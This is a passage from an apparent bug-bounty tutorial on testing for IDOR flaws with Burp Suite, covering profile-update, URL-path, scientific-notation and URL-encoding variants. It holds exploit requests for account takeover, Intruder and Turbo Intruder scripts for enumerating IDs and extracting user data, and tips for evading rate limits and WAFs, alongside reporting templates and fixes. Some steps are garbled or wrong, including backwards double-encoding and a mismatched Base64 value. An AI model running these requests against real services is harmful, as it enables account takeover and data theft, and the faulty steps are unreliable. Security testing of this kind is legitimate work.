user_id=100&name=Attacker&email=attacker@evil.com

Exploit Request (Victim User ID 105):
-------------------------------------
POST /profile/update HTTP/1.1
Host: target.com
Cookie: session=ATTACKER_SESSION
Content-Type: application/x-www-form-urlencoded

user_id=105&name=HACKED&email=hacked@evil.com

Response:
---------
HTTP/1.1 200 OK
{"status":"success","message":"Profile updated"}

Impact: Attacker can modify ANY user's profile information
```

#### **Step 20: Automate with Burp Macro (Optional)**

**Create Macro for repeated testing:**
1. Project Options → Sessions
2. Add Macro
3. Record login sequence
4. Use macro to maintain session

---

## 📊 **Burp Suite Configuration Summary**

### **Intruder Settings:**
```
Attack Type: Sniper
Payloads: Numbers 1-200
Resource Pool: 5 threads, 0 delay
Grep - Extract: Response body for success messages
Grep - Match: "success", "updated", "error", "unauthorized"
```

### **Repeater Usage:**
```
Send suspicious requests here for manual testing
Use "Search" feature to find specific strings
Compare responses with "Diff" feature
```

### **Scanner Checks:**
1. Enable "Scan for IDOR" in active scan
2. Add custom insertion points
3. Use session handling rules

---

## 🚨 **Critical Testing Scenarios**

### **Scenario 1: Email Change IDOR**
```
POST /change-email
user_id=105&new_email=attacker@evil.com
→ Victim loses account access
```

### **Scenario 2: Password Change IDOR**
```
POST /change-password
user_id=105&new_pass=Hacked123
→ Complete account takeover
```

### **Scenario 3: 2FA Disable IDOR**
```
POST /disable-2fa
user_id=105&confirm=true
→ Bypass victim's security
```

### **Scenario 4: Profile Picture Update**
```
POST /upload-avatar
user_id=105&avatar=evil.jpg
→ Deface victim's profile
```

---

## 📝 **Reporting Template**

```
# IDOR Vulnerability in Profile Update Functionality

## Summary
The profile update endpoint lacks proper authorization checks, allowing any authenticated user to modify any other user's profile information by manipulating the user_id parameter.

## Affected Endpoint
POST /profile/update

## Vulnerability Type
Insecure Direct Object Reference (IDOR)

## Steps to Reproduce
1. Login as attacker (User A: ID 100)
2. Intercept profile update request
3. Change user_id parameter from 100 to 105 (victim)
4. Forward the request
5. Observe success response
6. Login as victim (User B) to confirm changes persisted

## Proof of Concept
[Include screenshots/HTTP requests]

## Impact
- Unauthorized modification of any user's profile
- Potential account takeover (if email/password can be changed)
- Data integrity compromise
- Privacy violation

## Recommended Fix
Implement server-side authorization checks:
```python
def update_profile(request):
    user_id = request.POST.get('user_id')
    # Verify the authenticated user owns this profile
    if request.user.id != int(user_id):
        return HttpResponseForbidden()
    # Proceed with update
```

## CVSS Score
7.5 (High) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
```

---

## 🛡️ **Defense Bypass Techniques**

If initial tests fail, try these:

### **1. Use Valid Victim Session**
```
If you have User B's session cookie:
POST /profile/update
Cookie: session=VICTIM_SESSION
user_id=105&name=attacker
```

### **2. Test After Logout**
```
1. Perform update with victim ID
2. Logout
3. Check if changes persist
```

### **3. Test with Different Roles**
```
Test with:
- Regular user → Regular user
- Regular user → Admin
- Admin → Regular user
- User → Different company/tenant
```

### **4. Time-Based Testing**
```
Test IDOR with:
- Active sessions
- Expired sessions
- Different times of day
```

---

## 🎯 **Common Profile Update Fields to Test**

| Field | Impact Level | Test Priority |
|-------|--------------|---------------|
| Email | 🔴 Critical | 1 |
| Password | 🔴 Critical | 1 |
| Username | 🟡 Medium | 2 |
| Full Name | 🟢 Low | 3 |
| Bio/About | 🟢 Low | 3 |
| Profile Picture | 🟡 Medium | 2 |
| Phone Number | 🟡 Medium | 2 |
| Address | 🟢 Low | 3 |
| Security Questions | 🔴 Critical | 1 |
| 2FA Settings | 🔴 Critical | 1 |
| Privacy Settings | 🟡 Medium | 2 |
| Notification Settings | 🟢 Low | 3 |

---

## ✅ **Checklist for Bug #8**

- [ ] Identified profile update endpoint
- [ ] Captured update request
- [ ] Located user identifier parameter
- [ ] Configured Burp Intruder
- [ ] Created payload list
- [ ] Executed attack
- [ ] Analyzed responses
- [ ] Found successful IDOR
- [ ] Manual verified
- [ ] Tested different methods
- [ ] Tested different locations
- [ ] Documented proof
- [ ] Created report
- [ ] Developed fix recommendation

---

## ⚠️ **Important Notes**

1. **Always use test accounts** - Never test on real users
2. **Monitor rate limiting** - Avoid DoS
3. **Document everything** - Screenshots, requests, responses
4. **Verify impact** - Ensure vulnerability is real
5. **Check scope** - Stay within authorized boundaries
6. **Responsible disclosure** - Report properly

---

# 🔍 **IDOR Bug #9: URL Path Manipulation - Complete Burp Suite Methodology**

## **Bug #9: URL Path Manipulation**
**Technique:** Changing object references directly in the URL path structure
**Example:** `/api/user/100` → `/api/user/101`

---

## 📊 **COMPREHENSIVE TESTING METHODOLOGY**

### **Phase 1: Reconnaissance & Mapping**

#### **1.1 Spider/Crawl the Application**
```
Target: https://target.com
Burp Steps:
1. Configure browser with Burp proxy (127.0.0.1:8080)
2. Turn on Intercept (Proxy > Intercept > Intercept is on)
3. Browse application normally
4. Use Spider: Right-click host > Spider this host
5. Use Engagement Tools > Discover Content
```

#### **1.2 Identify URL Patterns**
Look for these URL structures:
```bash
# Common patterns to document
/api/users/123
/profile/123
/account/54321/view
/document/download/789
/order/2024/12345
/user/profile?id=456  # Note: Not pure path, but similar
```

**Burp Techniques:**
- **Filter by parameter**: Proxy > HTTP History > Filter by parameter
- **Search for numbers**: Use Ctrl+F with regex `\d+`
- **Target Scope**: Set target scope (Right-click URL > Add to scope)

---

### **Phase 2: Baseline Testing**

#### **2.1 Account Setup**
Create multiple test accounts:
```bash
Account A: attacker@test.com (your control)
Account B: victim@test.com (target account)
Account C: admin@test.com (if possible)
```

#### **2.2 Burp Project Setup**
```
1. File > New Project > Temporary Project (or use existing)
2. Ensure Scope is set: Target > Scope > Add
3. Turn off interception for static files: 
   Proxy > Options > Intercept Client Requests > Add condition
```

---

### **Phase 3: Manual Testing with Burp Repeater**

#### **3.1 Identify Your Own Resources**
Find a URL referencing your account/resource:
```
Original: https://target.com/api/user/100/profile
Capture this request in Burp
```

#### **3.2 Send to Repeater**
```
1. Right-click request > Send to Repeater
2. Go to Repeater tab
3. You'll see: GET /api/user/100/profile HTTP/2
```

#### **3.3 Sequential ID Testing**
```http
# Original Request
GET /api/user/100/profile HTTP/2
Host: target.com
Cookie: session=YOUR_SESSION

# Test 1: Increment
GET /api/user/101/profile HTTP/2

# Test 2: Decrement  
GET /api/user/99/profile HTTP/2

# Test 3: Large jump
GET /api/user/999999/profile HTTP/2
```

**Response Analysis in Repeater:**
- **200 OK** with other user's data → **IDOR Found!**
- **403 Forbidden** → Probably blocked
- **302 Redirect** → Check Location header
- **404 Not Found** → ID might not exist
- **400 Bad Request** → Parameter validation

---

### **Phase 4: Automated Testing with Burp Intruder**

#### **4.1 Configure Intruder Attack**

**Step 1: Position the Payload**
```http
GET /api/user/§100§/profile HTTP/2
Host: target.com
Cookie: session=YOUR_SESSION
```
- Highlight `100` and click "Add §"

**Step 2: Payload Configuration**
```
Payload type: Numbers
Number range: 1-1000 (start with small range)
Step: 1
Number format: Decimal
Min/max digits: As needed
```

**Step 3: Resource Pool**
```
Intruder > Resource Pool
Create new pool
Max concurrent requests: 5 (to avoid rate limiting)
Delay: 200-500ms
```

**Step 4: Settings Tab**
```
Grep - Extract: Add response items to extract
   - Name: "email" regex: "email":"([^"]+)"
   - Name: "username" regex: "username":"([^"]+)"
   
Grep - Match: Add strings to identify valid responses
   - "Unauthorized"
   - "Access Denied"
   - "profile"
   - victim@test.com
   
Response analysis:
   - Store full response
   - Follow redirects: Never/On-site/Always
```

#### **4.2 Run Attack**
Click "Start Attack" and monitor results

**Analyze Results:**
- Sort by Status Code
- Sort by Response Length
- Look for 200s with different lengths
- Check extracted grep values

---

### **Phase 5: Advanced Burp Techniques**

#### **5.1 Using Burp Comparer**
```
1. Intruder results > Select interesting responses
2. Right-click > Send to Comparer
3. Go to Comparer tab
4. Compare responses side by side
```

#### **5.2 Burp Sequencer for Predictable IDs**
If IDs look random but predictable:
```
1. Capture 100+ ID requests
2. Send to Sequencer
3. Analyze token randomness
```

#### **5.3 Active Scan**
```
1. Right-click request > Do an active scan
2. Check "Insertion point" customization
3. Add custom insertion points for URL paths
```

---

### **Phase 6: Edge Cases & Variations**

#### **6.1 Test with Different HTTP Methods**
```http
# Original GET
GET /api/user/100/profile

# Try POST with same path
POST /api/user/101/profile
Content-Type: application/json

{"action":"view"}

# Try PUT
PUT /api/user/101/profile
{"email":"new@email.com"}

# Try DELETE
DELETE /api/user/101/profile
```

#### **6.2 Version/API Endpoint Variations**
```http
# API versioning
/api/v1/user/101/profile
/api/v2/user/101/profile  
/api/latest/user/101/profile

# Different formats
/api/user/101/profile.json
/api/user/101/profile.xml
/api/user/101?format=json
```

#### **6.3 Path Traversal in URL**
```http
# Directory traversal
/api/user/100/../101/profile
/api/user/100/../../admin/101/profile
/api/user//101/profile
```

#### **6.4 Case Sensitivity**
```http
/api/USER/101/profile
/api/User/101/profile
/api/uSeR/101/profile
```

---

### **Phase 7: Burp Extensions for IDOR**

#### **7.1 Recommended Extensions**
```
Extender > BApp Store > Install:

1. Autorize - Automatic authorization testing
2. AuthMatrix - Advanced auth testing
3. JSON Web Tokens - JWT manipulation
4. Param Miner - Discover hidden parameters
5. Backslash Powered Scanner - Advanced scanning
```

#### **7.2 Autorize Configuration**
```
1. Install Autorize extension
2. Configure with victim session cookies
3. Set to "Auto" mode
4. Browse as attacker - Autorize tests with victim session
```

#### **7.3 Custom Extender Script (Python)**
```python
from burp import IBurpExtender, IHttpListener
import re

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("IDOR Path Hunter")
        callbacks.registerHttpListener(self)
        print("IDOR Hunter loaded - Monitoring path parameters")
        
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not messageIsRequest:
            return
            
        request = messageInfo.getRequest()
        analyzed = self._helpers.analyzeRequest(request)
        url = analyzed.getUrl().toString()
        
        # Look for numeric IDs in path
        path = url.split("?")[0]
        numbers = re.findall(r'/(\d+)/', path)
        
        if numbers:
            print(f"Found potential IDOR target: {url}")
            print(f"Path parameters: {numbers}")
```

---

### **Phase 8: Validation & Exploitation**

#### **8.1 Manual Verification**
```http
# Step 1: Test with attacker session on victim ID
GET /api/user/101/profile
Cookie: session=ATTACKER_SESSION

# Expected: Should fail (403/401)

# Step 2: Capture actual victim request (if possible)
# Use second browser with victim session
GET /api/user/101/profile
Cookie: session=VICTIM_SESSION

# Step 3: Compare responses
# If Step 1 returns victim data → IDOR Confirmed
```

#### **8.2 Data Extraction Automation**
Create Intruder payload for data extraction:
```http
GET /api/user/§100§/profile HTTP/2

Extract with regex:
- Email: "email":"([^"]+)"
- Phone: "phone":"([^"]+)"
- Address: "address":"([^"]+)"
- Account balance: "balance":([0-9.]+)
```

#### **8.3 Burp Collaborator for Blind IDOR**
If IDOR doesn't return data directly:
```http
# Test for blind IDOR that triggers actions
POST /api/user/101/notify
{"message":"test", "callback":"http://collaborator-id.burpcollaborator.net"}
```

---

### **Phase 9: Bypassing Protections**

#### **9.1 Rate Limiting Bypass**
```
Intruder > Resource Pool
Set delays and throttling
Use IP rotation if possible (Burp Professional)
```

#### **9.2 WAF/Filter Bypass**
```http
# Encoding variations
/api/user/%31%30%31/profile  # URL encoded 101
/api/user/101%00/profile      # Null byte
/api/user/101/./profile       # Path traversal
/api/user//101//profile       # Double slash
```

#### **9.3 Session/Bearer Token Tests**
```http
# Test with different auth states
GET /api/user/101/profile
Authorization: Bearer eyJhbGci... (modified token)
Cookie: session= (empty)
Cookie: session=INVALID
```

---

### **Phase 10: Reporting Template**

#### **10.1 Burp Evidence Collection**
```
1. Right-click request > Save item
2. Proxy > HTTP History > Select requests > Save
3. Intruder results > Save results table
4. Screenshot: Window > Capture
```

#### **10.2 Report Structure**
```markdown
# IDOR Vulnerability: URL Path Manipulation

## Summary
Direct object reference in `/api/user/[id]/profile` allows unauthorized access.

## Affected Endpoint
`GET /api/user/{id}/profile`

## Steps to Reproduce
1. Login as attacker (attacker@test.com)
2. Capture request to /api/user/100/profile
3. Change path to /api/user/101/profile
4. Observe victim data returned

## Burp Requests/Responses
[Include saved requests]

## Impact
- Unauthorized access to user profiles
- Data exposure: [list data types]
- [Additional impacts]

## Proof of Concept
[Attach screenshots showing access to victim data]

## Remediation
- Implement proper authorization checks
- Use indirect reference maps
- Apply principle of least privilege
```

---

### **Phase 11: Advanced Intruder Payloads**

#### **11.1 Custom Wordlist for IDs**
Create file `ids.txt`:
```bash
1
10
100
1000
9999
admin
root
administrator
0001
00001
```

#### **11.2 Payload Processing Rules**
```
Intruder > Payloads > Payload Processing
Add:
1. Add prefix: "user_" → user_101
2. Add suffix: "_profile" → 101_profile  
3. Encode: URL-encode characters
4. Hash: MD5 of payload
```

#### **11.3 Cluster Bomb Attack**
```http
GET /api/§userType§/§id§/profile
Payload Set 1: [user, account, profile, admin]
Payload Set 2: [100,101,102,103]
```

---

## 🛡️ **Protection Testing Checklist**

- [ ] Test with different user roles
- [ ] Test with expired sessions
- [ ] Test with modified tokens
- [ ] Test across different browsers
- [ ] Test with Incognito/Private mode
- [ ] Test after logout
- [ ] Test with concurrent requests
- [ ] Test with special characters
- [ ] Test with boundary values

---

## 📚 **Burp Shortcuts for IDOR Testing**

```
Ctrl+R        - Send to Repeater
Ctrl+I        - Send to Intruder
Ctrl+Shift+B  - Send to Comparer
Ctrl+Shift+X  - Send to Sequencer
Ctrl+F        - Search in response
Ctrl+U        - URL decode selected
Ctrl+Shift+U  - URL encode selected
F2            - Rename tab in Repeater
```

---

## ⚡ **Quick Test Commands**

```bash
# Quick intruder payload for common ranges
1-1000
1000-2000
9990-10000
100000-101000

# Interesting values
-1,0,1,999999,2147483647,4294967295
admin,root,test,backup,dev
0001,001,01,1.0,1,1
```

---

## 🎯 **Success Indicators**
- **Different user data appears**
- **Different response length**
- **Different status codes**
- **Error messages revealing info**
- **Redirects to user-specific pages**
- **Timing differences**
- **Partial data leakage**

---

# 🎯 **Bug #10: Scientific Notation IDOR - Full Burp Suite Methodology**

## 📋 **Bug Description**
**IDOR via Scientific Notation** - Using scientific notation (e.g., `1e2` for 100) to bypass input validation and access unauthorized resources.

---

## 🔍 **DETECTION PHASE**

### **Step 1: Initial Reconnaissance**

#### **A. Identify Potential Endpoints**
1. **Map the application** using Burp Spider/Content Discovery:
```bash
# Target URLs to look for
/profile?id=100
/user/100
/api/user/100
/download?file_id=100
/order/100
```

2. **Burp Configuration:**
```
Target → Site Map → Right-click → Engage Tool → Discover Content
```

3. **Look for patterns in:**
- URL paths (`/user/123`)
- Query parameters (`?user_id=123`)
- POST bodies (`{"id": 123}`)
- RESTful endpoints (`/api/v1/users/123`)

#### **B. Parameter Discovery**
Use **Burp Intruder** with parameter wordlists:

1. **Load request in Repeater**
2. **Send to Intruder** (Ctrl+I)
3. **Positions tab**: Clear §, add § around parameter values
4. **Payloads**: Load parameter names list
```
id
user_id
uid
account_id
profile_id
file_id
document_id
order_id
ref_id
reference
```

---

## 🧪 **TESTING PHASE**

### **Step 2: Baseline Testing**

#### **A. Identify Valid IDs**
1. **Capture a request** with a valid ID:
```
GET /api/user/100 HTTP/1.1
Host: target.com
Cookie: session=abc123
```

2. **Send to Intruder** for ID enumeration:
```
GET /api/user/§100§ HTTP/1.1
```

**Payload settings:**
- Payload type: Numbers
- Range: 1-200
- Step: 1

3. **Analyze responses:**
- **200 OK** - Valid ID (your own)
- **403 Forbidden** - Valid but unauthorized
- **404 Not Found** - Invalid ID
- **302 Redirect** - Possible valid ID

#### **B. Verify IDOR Vulnerability**
Test simple sequential ID changes:
1. Send original request to Repeater
2. Change `100` to `101`
3. Check response:
   - If you see another user's data → **IDOR confirmed**
   - If 403/404 → Continue testing

---

### **Step 3: Scientific Notation Testing**

#### **A. Basic Scientific Notation**
Convert decimal IDs to scientific notation:

**Original:** `id=100`
**Scientific notation:** `id=1e2`

**Burp Repeater Process:**
1. **Send request to Repeater**
2. **Modify parameter:**
```
GET /api/user/1e2 HTTP/1.1
```
3. **Check response:**
   - If same as `id=100` → Scientific notation accepted
   - If different → Server not parsing scientific notation

#### **B. Scientific Notation Variations**

| Decimal | Scientific | Test Cases |
|---------|------------|------------|
| 100 | 1e2 | `/user/1e2` |
| 200 | 2e2 | `/user/2e2` |
| 1000 | 1e3 | `/user/1e3` |
| 123 | 1.23e2 | `/user/1.23e2` |
| 50 | 5e1 | `/user/5e1` |

#### **C. Edge Cases Testing**
```
1e0  (equals 1)
1e1  (equals 10)
1.5e2 (equals 150)
-1e2 (negative scientific)
+1e2 (positive sign)
1E2 (uppercase E)
1e+2 (explicit positive exponent)
1e-2 (fraction - usually not valid for IDs)
```

---

## ⚙️ **BURP INTRUDER CONFIGURATION**

### **Step 4: Automated Scientific Notation Testing**

#### **A. Payload Generation**

**Method 1: Custom Payload List**
Create a file `scientific_notation.txt`:
```
1e0
1e1
1e2
2e2
3e2
4e2
5e2
1e3
2e3
1.5e2
1.23e2
1E2
1e+2
```

**Method 2: Burp Intruder Payload Processing**

1. **Load number list** (1-1000)
2. **Add Payload Processing:**
```
Add prefix: ""
Add suffix: ""
Add rule: Convert to scientific notation
```

**Custom payload processing rule:**
```python
# Using Burp's Extension (Python)
def process(payload):
    num = int(payload)
    return f"{num:e}"  # Scientific notation
```

#### **B. Intruder Attack Configuration**

**Attack Type:** Sniper

**Resource Pool:**
- Threads: 5-10 (avoid rate limiting)
- Throttle: 100-200ms between requests

**Grep - Extract:**
Configure to extract:
- Response status code
- Content-Length
- Response time
- Error messages
- User identifiers

**Grep - Match:**
Add strings to identify successful IDOR:
- "unauthorized"
- "forbidden"
- other usernames
- email addresses
- personal data patterns

---

## 📊 **RESPONSE ANALYSIS**

### **Step 5: Result Analysis**

#### **A. Compare Responses**

**Original Request (id=100):**
```
HTTP/1.1 200 OK
Content-Length: 2450
{
  "id": 100,
  "username": "current_user",
  "email": "user@test.com"
}
```

**Scientific Notation Request (id=1e2):**
```
HTTP/1.1 200 OK
Content-Length: 2450  ← Same length indicates success
{
  "id": 100,
  "username": "current_user",
  "email": "user@test.com"
}
```

#### **B. Successful IDOR Indicators**

When testing other user IDs with scientific notation:

**Victim ID 101 (decimal):**
```
HTTP/1.1 403 Forbidden
```

**Victim ID 101 (scientific: 1.01e2):**
```
HTTP/1.1 200 OK
Content-Length: 2450
{
  "id": 101,
  "username": "victim_user",  ← Different username
  "email": "victim@test.com"   ← Different email
}
```

#### **C. Burp Intruder Result Sorting**

1. **Sort by Status Code:**
   - 200 OK (potential hits)
   - 302 Found (redirects)
   - 500 Error (possible bypass)

2. **Sort by Content-Length:**
   - Group similar lengths
   - Identify anomalies
   - Compare with baseline

3. **Sort by Response Time:**
   - Faster responses might indicate cached/valid data
   - Slower responses might indicate DB lookups

---

## 🔬 **ADVANCED TECHNIQUES**

### **Step 6: Bypass Validation**

#### **A. Combined Encoding**
Test scientific notation with other encodings:

**URL Encoded:**
```
GET /api/user/1e2      → Normal
GET /api/user/1%65%32  → URL encoded 'e' and '2'
GET /api/user/1%45%32  → URL encoded 'E' and '2'
```

**Double URL Encoded:**
```
1e2 → %31%65%32 → %2531%2565%2532
```

**Base64 + Scientific:**
```
1e2 → MSU2NSUzMg== (Base64)
```

#### **B. Parameter Pollution with Scientific Notation**

```
GET /api/user?id=100&id=1.01e2
GET /api/user?id=100&id[]=1.01e2
GET /api/user?user_id=100&id=1.01e2
```

#### **C. JSON Body Testing**

```json
{
  "id": "1.01e2",
  "user_id": 100,
  "data": {
    "reference": "1.01e2"
  }
}
```

---

## 🛠️ **BURP EXTENSIONS FOR IDOR**

### **Step 7: Useful Extensions**

#### **A. Install via BApp Store:**

1. **Autorize** - Automate authorization tests
2. **Authz** - Test with different cookies
3. **JSON Web Tokens** - Decode/modify JWT
4. **Param Miner** - Discover hidden parameters
5. **Backslash Powered Scanning** - Advanced scanning

#### **B. Custom Extension for Scientific Notation**

```python
# Simple Burp Extension for Scientific Notation Testing
from burp import IBurpExtender, IIntruderPayloadProcessor

class BurpExtender(IBurpExtender, IIntruderPayloadProcessor):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Scientific Notation Generator")
        callbacks.registerIntruderPayloadProcessor(self)
    
    def getProcessorName(self):
        return "Scientific Notation Converter"
    
    def processPayload(self, currentPayload, originalPayload, baseValue):
        try:
            num = int(currentPayload.tostring())
            scientific = "{:e}".format(num)
            return self._helpers.stringToBytes(scientific)
        except:
            return currentPayload
```

---

## 📈 **SCALING THE ATTACK**

### **Step 8: Automated Scanning**

#### **A. Burp Intruder Cluster Bomb Attack**

**Position 1:** User IDs (1-1000)
**Position 2:** Scientific Notation Flags

Payload sets:
1. Numbers: 1-1000
2. Formats: ["", "e", "E", "e+", "E+", ".0e"]

#### **B. Turbo Intruder Script**

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=100,
                           pipeline=False)

    for id in range(1, 1000):
        scientific = f"{id:e}"
        engine.queue(target.req, [scientific])
        
        # Test variations
        engine.queue(target.req, [scientific.upper()])
        engine.queue(target.req, [scientific.replace('e', 'e+')])
```

---

## 🔐 **EXPLOITATION**

### **Step 9: Exploiting the Vulnerability**

Once a scientific notation IDOR is found:

#### **A. Data Extraction**
```
# Enumerate all users
for id in range(1, 1000):
    scientific = f"{id:e}"
    response = burp_request(f"/api/user/{scientific}")
    if "username" in response:
        extract_data(response)
```

#### **B. Privilege Escalation**
```
# Find admin IDs (often low numbers)
admin_candidates = [1, 10, 100, 1000]
for id in admin_candidates:
    scientific = f"{id:e}"
    response = burp_request(f"/api/admin/{scientific}")
    if response.status == 200:
        print(f"Admin access with {scientific}")
```

#### **C. Chaining with Other Vulnerabilities**
1. Extract user IDs via scientific notation
2. Use extracted IDs for further attacks
3. Combine with XSS in user profile data

---

## 📝 **REPORTING**

### **Step 10: Documentation Template**

```markdown
# IDOR via Scientific Notation Bypass

## Vulnerability Details
- **Endpoint:** /api/user/{id}
- **Parameter:** id (path parameter)
- **Method:** GET
- **Severity:** High

## Description
The application accepts scientific notation (e.g., 1e2) in the ID parameter,
bypassing the authorization check that works for decimal IDs.

## Steps to Reproduce
1. Login as user 'attacker' (ID: 100)
2. Access legitimate profile: /api/user/100
3. Attempt to access victim ID 101: /api/user/101 → 403 Forbidden
4. Convert to scientific notation: /api/user/1.01e2
5. Observe victim's data returned: 200 OK

## Proof of Concept
```
Request:
GET /api/user/1.01e2 HTTP/1.1
Host: target.com
Cookie: session=attacker_session

Response:
HTTP/1.1 200 OK
{
  "id": 101,
  "username": "victim",
  "email": "victim@target.com",
  "ssn": "XXX-XX-XXXX"
}
```

## Impact
- Unauthorized access to all user profiles
- Data breach of PII
- Potential account takeover

## Remediation
- Implement strict input validation
- Use allowlist for numeric values
- Enforce authorization on parsed value
```

---

## 🛡️ **MITIGATION CHECKLIST**

For developers to fix this issue:

- [ ] Disable scientific notation parsing in ID parameters
- [ ] Use regex: `^\d+$` for numeric IDs
- [ ] Implement server-side authorization checks
- [ ] Use indirect reference maps (UUIDs)
- [ ] Add rate limiting on API endpoints
- [ ] Log and monitor unusual parameter formats

---

## 🎯 **KEY SUCCESS INDICATORS**

Look for these signs of successful exploitation:

1. **Same content-length** as valid requests
2. **Different usernames/emails** in response
3. **200 OK** status codes for other users' data
4. **No CSRF tokens** required for sensitive data
5. **Consistent response times** indicating valid data retrieval

---

## ⚠️ **TROUBLESHOOTING**

| Problem | Solution |
|---------|----------|
| Rate limiting detected | Add delays, rotate IPs, use proxy chains |
| WAF blocking | Try different encodings, lowercase/uppercase |
| No scientific notation support | Try other techniques from the master list |
| Session expires | Automate re-authentication |

---

# 🔍 **Bug #11: URL Encoding IDOR - Complete Burp Suite Methodology**

## 📋 **Understanding Bug #11 - URL Encoded IDOR**
**Bug #11** refers to testing IDOR vulnerabilities using **URL encoding** techniques. When an application accepts encoded values, it might decode them before processing, potentially bypassing input filters or authorization checks.

---

## 🎯 **Target Scenarios**
Look for these patterns:
- `GET /api/user/100` → Test `/api/user/%31%30%30`
- `POST /api/document?id=100` → Test `id=%31%30%30`
- JSON/XML APIs accepting encoded values
- Applications with WAF/input filters

---

## 🛠️ **PHASE 1: Reconnaissance in Burp**

### **Step 1.1: Configure Burp Suite**
```
Proxy → Intercept → Turn intercept ON
Target → Site map → Add to scope
```

### **Step 1.2: Map the Application**
1. Browse normally while recording
2. Pay special attention to:
   - Numeric IDs in URLs (`/user/123`)
   - Parameters in POST bodies (`user_id=456`)
   - File paths (`/download/789.pdf`)
   - API endpoints (`/api/v1/orders/1001`)

### **Step 1.3: Identify Potential Targets**
Use **Burp Engagement Tools**:
```
Right-click request → Engagement Tools → 
- Find Comments
- Find References
- Discover Content
```

---

## 🔍 **PHASE 2: Manual Testing with Repeater**

### **Step 2.1: Basic URL Encoding Tests**

#### **Test Case A: Simple Numeric Encoding**
Original Request:
```
GET /api/user/100 HTTP/1.1
Host: example.com
Cookie: session=abc123
```

Modified Request (Repeater):
```
GET /api/user/%31%30%30 HTTP/1.1
Host: example.com
Cookie: session=abc123
```

**URL Encoding Table for Numbers:**
```
0 = %30    5 = %35
1 = %31    6 = %36
2 = %32    7 = %37
3 = %33    8 = %38
4 = %34    9 = %39
```

### **Step 2.2: Multiple Encodings in Repeater**

#### **Test different positions:**
```
1. Full encoding: /api/user/%31%30%30
2. Partial encoding: /api/user/1%30%30
3. Mixed encoding: /api/user/%31%300
4. Leading encoding: /api/user/%31%300%30
```

#### **Burp Repeater Setup:**
```
# Send to Repeater (Ctrl+R)
# Modify the encoded values
# Send and compare responses
```

---

## 🤖 **PHASE 3: Automated Testing with Intruder**

### **Step 3.1: Intruder Basic Setup**

1. **Send request to Intruder** (Ctrl+I)
2. **Select attack type**: Sniper or Battering ram
3. **Mark payload position**:
```
GET /api/user/§100§ HTTP/1.1
```

### **Step 3.2: Create URL Encoding Payloads**

#### **Method A: Built-in Encoder**
```
Payloads tab → 
Payload type: Custom iterator
Add positions:
- Position 1: 1,2,3,4,5,6,7,8,9,0
- Position 2: 1,2,3,4,5,6,7,8,9,0
- Position 3: 1,2,3,4,5,6,7,8,9,0

Process: URL-encode each position
```

#### **Method B: Pre-computed Payload List**
Create payloads.txt:
```
%31%30%30  (100)
%31%30%31  (101)
%31%30%32  (102)
%32%30%30  (200)
%39%39%39  (999)
```

#### **Method C: Using Burp's Payload Processing**
```
Payloads tab →
Add → Add from list → Numbers (1-1000)

Payload Processing:
1. Add: Add prefix → "%"
2. Add: Add prefix → "3" [for each digit? Better to use:]
   Actually, use custom encoder:

Better approach:
Payload Processing Rules:
1. Convert to string
2. Add: URL-encode key characters
3. Or use: Add custom iterator
```

### **Step 3.3: Advanced Intruder Configuration**

#### **Attack Types for URL Encoding:**

**Sniper** - Test one encoded value at a time:
```
GET /api/user/§ENCODED_ID§
Payloads: %31%30%30, %31%30%31, %32%30%30
```

**Pitchfork** - Test multiple encoded parts:
```
GET /api/user/%§31§%§30§%§30§
Payload set 1: 31,32,33 (first digit)
Payload set 2: 30,31,32 (second digit)
Payload set 3: 30,31,32 (third digit)
```

**Cluster Bomb** - All combinations:
```
GET /api/user/%§31§%§30§%§30§
Will generate 1000 combinations (10×10×10)
```

### **Step 3.4: Grep - Match for Analysis**

```
Intruder → Options → Grep - Match
Add strings to identify successful hits:
- "Welcome"
- "Profile"
- "Account"
- "200 OK"
- Your username
- "Unauthorized" (for false positives)
- "Access Denied" (negative indicator)

Grep - Extract:
- Extract response length
- Extract response title
- Extract status code
```

---

## 🎯 **PHASE 4: Advanced Testing Techniques**

### **Step 4.1: Double URL Encoding**

If application decodes once, try double encoding:

```
Original: 100
URL encode: %31%30%30
Double encode: %2531%2530%2530
```

**Double Encoding Process:**
```
1. Take value: 100
2. First encode: %31%30%30
3. Encode the % signs: %25 becomes %
Final: %2531%2530%2530
```

#### **Burp Intruder Setup for Double Encoding:**
```
Payload: 100,101,102
Payload Processing:
1. URL-encode all characters → %31%30%30
2. URL-encode all characters again → %2531%2530%2530
```

### **Step 4.2: Mixed Encoding Techniques**

**Test different encoding styles:**
```
Standard:  /user/%31%30%30
Lowercase: /user/%31%30%30
Uppercase: /user/%31%30%30 (same)
Alternating: /user/%31%30%30

Non-ASCII: Try UTF-8 encoding
- 100 in UTF-8: \u0031\u0030\u0030
- URL encoded UTF-8: %C4%B1 etc. (doesn't work well for numbers)
```

### **Step 4.3: Path-based URL Encoding**

```
Original: /api/user/100/profile
Test:     /api/user/%31%30%30/profile
Test:     /api/user/100/%70%72%6F%66%69%6C%65 (encode 'profile')
Test:     /%61%70%69/%75%73%65%72/%31%30%30 (encode everything)
```

---

## 🔬 **PHASE 5: Response Analysis**

### **Step 5.1: Using Comparer**

```
1. Select baseline response (valid user)
2. Select test response
3. Right-click → Send to Comparer
4. Compare for differences:
   - Content length
   - Status codes
   - Response time
   - Specific strings
```

### **Step 5.2: Automating Detection with Extensions**

**Install Burp Extensions:**
```
Extender → BApp Store → Install:
1. Turbo Intruder - For high-speed attacks
2. HTTP Request Smuggler - For encoding edge cases
3. Autorize - For authorization checks
4. AuthMatrix - For permission testing
5. JSON Web Tokens - If IDs in JWT
```

### **Step 5.3: Turbo Intruder Script for URL Encoding**

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False)
    
    # Generate encoded numbers 1-1000
    for i in range(1, 1001):
        # Convert to string and URL encode each digit
        encoded = ''.join(['%' + hex(ord(d))[2:].zfill(2).upper() 
                          for d in str(i)])
        
        engine.queue(target.req, encoded)
        
def handleResponse(req, interesting):
